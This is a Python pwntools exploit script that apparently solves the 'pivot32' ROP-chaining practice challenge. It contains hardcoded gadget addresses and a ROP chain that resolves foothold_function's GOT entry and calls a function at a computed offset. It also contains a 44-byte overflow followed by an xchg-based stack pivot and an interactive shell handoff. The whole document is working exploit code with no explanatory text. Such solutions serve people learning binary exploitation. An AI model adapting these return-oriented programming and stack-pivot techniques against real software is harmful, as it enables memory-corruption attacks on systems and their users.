from pwn import *

context(arch='i386', os='linux')
binary_name = 'pivot32'
p = process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

# 0x080488c0 : pop eax ; ret
pop_eax =      0x080488c0
# 0x080488c2 : xchg eax, esp ; ret
xchg_eax_esp = 0x080488c2
# 0x08048571 : pop ebx ; ret
pop_ebx =      0x08048571
# 0x080488c7 : add eax, ebx ; ret
add_eax_ebx =  0x080488c7
# 0x080488c4 : mov eax, dword ptr [eax] ; ret
mov_eax_eax =  0x080488c4
# 0x080486a3 : call eax
call_eax  =    0x080486a3

foothold_function_PLT = elf.plt["foothold_function"]
foothold_function_GOT = elf.got["foothold_function"]
MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']
recv = p.recvuntil("> ")

pivot_address = recv.split("pivot: ")[1].split("\n")[0]
pivot_address_hexa = int(pivot_address, 16)

log.info("foothold_function plt:    " + hex(foothold_function_PLT))
log.info("foothold_function GOT:    " + hex(foothold_function_GOT))
log.info("Main start:               " + hex(MAIN_PLT))
log.info("Puts plt:                 " + hex(PUTS_PLT))
log.info("Pivot address:            "+  str(pivot_address))

rop  = ""
rop += p32(foothold_function_PLT)
rop += p32(pop_eax) + p32(foothold_function_GOT)
rop += p32(mov_eax_eax)
rop += p32(pop_ebx) + p32(0x1F7)
rop += p32(add_eax_ebx)
rop += p32(call_eax)

p.sendline(rop)
recv = (p.recvline())

# Stack pivot
stack_pivot = "A" * 44 + p32(pop_eax) + p32(pivot_address_hexa) + p32(xchg_eax_esp) 
p.sendline(stack_pivot)

p.interactive()